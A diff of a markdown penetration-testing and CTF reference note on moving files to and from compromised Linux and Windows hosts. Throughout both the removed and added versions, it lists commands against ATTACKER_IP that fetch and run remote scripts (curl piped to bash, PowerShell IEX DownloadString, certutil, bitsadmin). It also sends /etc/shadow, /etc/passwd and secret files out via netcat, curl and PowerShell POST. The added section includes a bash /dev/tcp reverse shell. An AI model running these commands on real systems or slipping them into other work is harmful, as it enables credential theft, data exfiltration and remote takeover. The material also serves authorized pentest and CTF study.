@@ -1,268 +1,232 @@
-﻿---
+---
 title: File Transfer Techniques
 tags:
   - reference
-  - cheat-sheet
   - file-transfer
   - post-exploitation
-  - foundational
-created: 2026-03-23
-updated: 2026-04-04
-difficulty: foundational
+  - ctf
+  - linux
+  - windows
+topic: Reference
+difficulty: intermediate
+created: 2026-05-16
+updated: 2026-05-16
+source: HackTricks, PayloadsAllTheThings, GTFOBins
 ---
 
 # File Transfer Techniques
 
-Moving files between attacker and target — and between systems during lateral movement — is a fundamental skill. Different environments have different tools available; know multiple methods.
-
-> ⚠️ For authorized penetration testing and CTF use only.
-
----
-
-## Attacker → Target (Delivering Payloads / Tools)
-
-### Python HTTP Server (most common setup)
-```bash
-# Attacker — serve current directory
-python3 -m http.server 80
-python3 -m http.server 8080
-python2 -m SimpleHTTPServer 80
-```
-
-Then on target, download using any available method below.
+## Overview
+Getting tools and payloads onto a target machine — or exfiltrating data off it — is a core skill in penetration testing and CTFs. This note covers reliable methods for both Linux and Windows targets, organized by what's available on the system.
 
 ---
 
-## Linux Target — Download Methods
+## Linux — Downloading to Target
 
+### curl / wget (most common)
 ```bash
-# wget
-wget http://ATTACKER_IP/file -O /tmp/file
-wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
-
 # curl
-curl http://ATTACKER_IP/file -o /tmp/file
-curl http://ATTACKER_IP/file > /tmp/file
+curl http://ATTACKER_IP:8000/file.sh -o file.sh
+curl http://ATTACKER_IP:8000/file.sh | bash    # Execute directly
 
-# Execute in memory (no file on disk)
-curl http://ATTACKER_IP/linpeas.sh | bash
-wget -qO- http://ATTACKER_IP/script.sh | bash
+# wget
+wget http://ATTACKER_IP:8000/file.sh -O file.sh
+wget -q http://ATTACKER_IP:8000/file.sh -O- | bash   # Execute directly
+```
 
-# Netcat
+### Python HTTP Server (on attacker machine)
+```bash
+# Python 3 (start in directory containing your files)
+python3 -m http.server 8000
+
+# Python 2
+python -m SimpleHTTPServer 8000
+```
+
+### Netcat
+```bash
+# Attacker (sender) — listen and serve file
+nc -lvnp 4444 < file.sh
+
+# Target (receiver)
+nc ATTACKER_IP 4444 > file.sh
+
+# Reverse: target sends file to attacker
 # Attacker:
-nc -lvnp 4444 < file
+nc -lvnp 4444 > received_file
 # Target:
-nc ATTACKER_IP 4444 > /tmp/file
+nc ATTACKER_IP 4444 < /etc/passwd
+```
 
-# SCP (requires SSH credentials or key)
-scp user@ATTACKER_IP:/path/to/file /tmp/file
+### SCP (when SSH is available)
+```bash
+# Push file to target
+scp file.sh user@TARGET_IP:/tmp/file.sh
 
-# Base64 encode/decode (no network tools needed)
-# Attacker:
-base64 linpeas.sh | xclip    # Copy to clipboard
-# Target (paste and decode):
-echo "BASE64STRING" | base64 -d > /tmp/linpeas.sh
+# Pull file from target
+scp user@TARGET_IP:/etc/passwd ./passwd
+```
 
-# /dev/tcp (bash built-in — no nc or curl needed)
-exec 3<>/dev/tcp/ATTACKER_IP/80
-echo -e "GET /file HTTP/1.0\r\nHost: ATTACKER_IP\r\n\r\n" >&3
-cat <&3 > /tmp/file
+### Base64 (bypass content filters)
+```bash
+# Encode on attacker
+base64 -w 0 file.sh > file.b64
+cat file.b64    # Copy the output
+
+# Decode on target (paste the base64 string)
+echo "BASE64STRING" | base64 -d > file.sh
+chmod +x file.sh
 ```
 
 ---
 
-## Windows Target — Download Methods
+## Windows — Downloading to Target
 
+### PowerShell (most reliable)
 ```powershell
-# PowerShell — Invoke-WebRequest (IWR)
-Invoke-WebRequest -Uri "http://ATTACKER_IP/file.exe" -OutFile "C:\Windows\Temp\file.exe"
-iwr -Uri "http://ATTACKER_IP/file.exe" -OutFile "C:\Windows\Temp\file.exe"
+# Basic download
+Invoke-WebRequest -Uri http://ATTACKER_IP:8000/file.exe -OutFile C:\Temp\file.exe
 
-# PowerShell — WebClient (older, no progress bar, faster)
-(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP/file.exe","C:\Windows\Temp\file.exe")
+# Shorter alias
+iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\Temp\file.exe
 
-# PowerShell — Download and execute in memory (fileless)
-IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/script.ps1")
-IEX(iwr "http://ATTACKER_IP/script.ps1" -UseBasicParsing)
+# Download and execute in memory (no disk touch)
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/script.ps1')
 
-# PowerShell — BITS (Background Intelligent Transfer Service)
-Start-BitsTransfer -Source "http://ATTACKER_IP/file.exe" -Destination "C:\Windows\Temp\file.exe"
+# Download with WebClient
+(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/file.exe', 'C:\Temp\file.exe')
+```
+
+### certutil (built-in, often not blocked)
+```cmd
+certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\Temp\file.exe
+```
+
+### bitsadmin (background transfer)
+```cmd
+bitsadmin /transfer myJob http://ATTACKER_IP:8000/file.exe C:\Temp\file.exe
+```
+
+### SMB (impacket-smbserver on attacker)
+```bash
+# Attacker — start SMB share
+impacket-smbserver share . -smb2support
+# or with auth:
+impacket-smbserver share . -smb2support -username user -password pass
 ```
 
 ```cmd
-:: CMD — certutil (LOLbin)
-certutil -urlcache -split -f http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe
+# Target — copy from SMB share
+copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe
 
-:: CMD — bitsadmin (LOLbin)
-bitsadmin /transfer job /download /priority normal http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe
-
-:: CMD — curl (Windows 10 1803+ has built-in curl)
-curl http://ATTACKER_IP/file.exe -o C:\Windows\Temp\file.exe
+# Or run directly
+\\ATTACKER_IP\share\file.exe
 ```
 
-```powershell
-# Base64 encode on attacker (Linux)
-base64 -w0 file.exe
-
-# Decode on Windows target
-[System.Convert]::FromBase64String("BASE64STRING") | Set-Content -Encoding Byte "C:\Windows\Temp\file.exe"
+### Curl (Windows 10+)
+```cmd
+curl http://ATTACKER_IP:8000/file.exe -o C:\Temp\file.exe
 ```
 
 ---
 
-## Target → Attacker (Exfiltrating Loot)
+## Exfiltration — Getting Data Out
 
 ### Linux → Attacker
-
 ```bash
-# Netcat — send file to listener
+# Netcat exfil
 # Attacker (receive):
-nc -lvnp 4444 > loot.txt
+nc -lvnp 4444 > loot.tar.gz
 # Target (send):
-nc ATTACKER_IP 4444 < /etc/shadow
+tar czf - /etc/ | nc ATTACKER_IP 4444
 
-# curl POST upload
-curl -X POST http://ATTACKER_IP:8080/upload -F "file=@/etc/shadow"
+# curl POST to attacker's web server
+curl -X POST http://ATTACKER_IP:8000/ -d @/etc/passwd
 
-# SCP
-scp /etc/shadow user@ATTACKER_IP:/loot/
-
-# Base64 print to terminal (copy/paste)
+# Base64 encode sensitive file, display for copy/paste
 base64 /etc/shadow
 ```
 
 ### Windows → Attacker
-
 ```powershell
-# PowerShell — upload via HTTP POST
-Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/upload" -Method POST -InFile "C:\loot.txt"
+# PowerShell POST
+$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secret.txt"))
+Invoke-WebRequest -Uri http://ATTACKER_IP:8000/ -Method POST -Body $data
 
-# PowerShell — upload via SMB share
-copy C:\loot.txt \\ATTACKER_IP\share\loot.txt
+# SMB — copy to attacker share
+copy C:\Users\user\Documents\secret.txt \\ATTACKER_IP\share\
 
-# Base64 print to terminal
-[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.txt"))
+# Certutil encode and display
+certutil -encode C:\secret.txt C:\encoded.txt
+type C:\encoded.txt
 ```
 
 ---
 
-## Attacker HTTP Upload Server
+## Restricted Environments (No Tools Available)
 
+### Python one-liners
 ```bash
-# Python upload server (receives POST files)
-pip3 install uploadserver
-python3 -m uploadserver 8080
-
-# Or use this one-liner script:
-# https://gist.github.com/UniIsland/3346170
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER_IP:8000/f','f')"
 ```
 
----
-
-## SMB File Transfer
-
+### /dev/tcp (bash built-in)
 ```bash
-# Attacker — create an SMB share (Impacket)
-sudo impacket-smbserver share /path/to/share -smb2support
-
-# Or with authentication
-sudo impacket-smbserver share /path/to/share -smb2support -username user -password pass
-
-# Target (Windows) — connect and copy
-copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe
-
-# Target (Linux) — mount SMB share
-sudo mount -t cifs //ATTACKER_IP/share /mnt/smb -o username=user,password=pass
-cp /mnt/smb/file /tmp/file
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1    # Reverse shell
+exec 3<>/dev/tcp/ATTACKER_IP/4444; cat <&3    # Read from attacker
 ```
 
----
-
-## SSH/SCP Transfer
-
+### PHP
 ```bash
-# Copy file to remote
-scp file.txt user@10.10.10.10:/tmp/
-
-# Copy file from remote
-scp user@10.10.10.10:/etc/shadow /tmp/shadow
-
-# Copy directory recursively
-scp -r /local/dir user@10.10.10.10:/tmp/dir
-
-# rsync (better for large transfers)
-rsync -avz /local/ user@10.10.10.10:/remote/
+php -r "file_put_contents('file.sh', file_get_contents('http://ATTACKER_IP:8000/file.sh'));"
 ```
 
----
-
-## FTP Transfer
-
+### Ruby
 ```bash
-# Attacker — start FTP server
-python3 -m pyftpdlib -p 21 -w    # Write-enabled
-
-# Target (Linux) — anonymous download
-ftp 10.10.10.10
-> anonymous
-> [blank password]
-> get file.exe
-
-# Target (Windows) — non-interactive FTP
-echo open ATTACKER_IP 21 > ftp.txt
-echo anonymous >> ftp.txt
-echo  >> ftp.txt
-echo binary >> ftp.txt
-echo get file.exe >> ftp.txt
-echo bye >> ftp.txt
-ftp -s:ftp.txt
+ruby -e "require 'open-uri'; File.write('file.sh', URI.open('http://ATTACKER_IP:8000/file.sh').read)"
 ```
 
 ---
 
-## When Nothing Else Works — Paste Methods
+## Serving Files From Attacker
 
-```bash
-# Print file as hex (target)
-xxd /etc/shadow | head -50
-# Reconstruct on attacker:
-xxd -r hex_dump.txt > shadow
-
-# Print as base64 (target)
-cat /etc/shadow | base64 -w 0
-# Decode on attacker:
-echo "BASE64" | base64 -d > shadow
-```
+| Method | Command | Notes |
+|--------|---------|-------|
+| Python HTTP | `python3 -m http.server 8000` | No auth, any file in dir |
+| PHP server | `php -S 0.0.0.0:8000` | No auth |
+| Netcat | `nc -lvnp 4444 < file` | Single connection |
+| SMB | `impacket-smbserver share . -smb2support` | Best for Windows targets |
+| FTP | `python3 -m pyftpdlib -p 21` | When FTP is only option |
 
 ---
 
-## Quick Decision Matrix
+## OPSEC Notes
 
-| Situation | Best Method |
-|---|---|
-| Linux target, curl available | `curl http://ATTACKER/file -o /tmp/file` |
-| Linux target, no curl/wget | `/dev/tcp` or base64 copy-paste |
-| Windows target, PowerShell available | `IWR` or `(New-Object Net.WebClient).DownloadFile()` |
-| Windows target, only CMD | `certutil` or `bitsadmin` |
-| Exfil from Linux | `nc` pipe or `curl POST` |
-| Exfil from Windows | PowerShell `Invoke-WebRequest POST` or SMB |
-| No outbound HTTP | SMB share or base64 paste |
-| Fileless execution needed | `IEX` (PS) or `curl | bash` (Linux) |
+- Python HTTP server logs all requests — good for confirming delivery
+- `/dev/tcp` leaves no artifacts on disk
+- SMB auth (`-username -password`) required when Windows requires authentication
+- Base64 bypasses many AV/EDR signatures on the payload itself but not behavior
+- Large file transfers via netcat are unreliable — use scp or SMB instead
 
-## Related Notes
-- Reverse-Shells
-- Netcat
-- Linux-Commands
-- Windows-Commands
-- Metasploit
+---
 
-## See Also
+## Key Terms
 
-- Netcat
-- Linux-Commands
-- Windows-Commands
-- Penetration-Testing-Methodology
-- Bash-Scripting
+| Term | Definition |
+|------|------------|
+| Exfiltration | Moving data from target to attacker-controlled system |
+| LOLBAS | Living Off the Land Binaries — built-in Windows tools repurposed |
+| SMB | Server Message Block — Windows file sharing protocol |
+| impacket | Python library with network protocol implementations for pentesters |
+| OPSEC | Operational Security — minimizing attacker footprint |
+
+## Sources
+
+Carlos Polop. (2024). *Exfiltration*. HackTricks. https://book.hacktricks.xyz/exfiltration
+
+swisskyrepo. (2024). *File transfer*. PayloadsAllTheThings. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/File%20Transfer.md
+
+GTFOBins. (n.d.). *Unix binaries — file download*. https://gtfobins.github.io/
 
 ---
 <- [[Reference-MOC]]
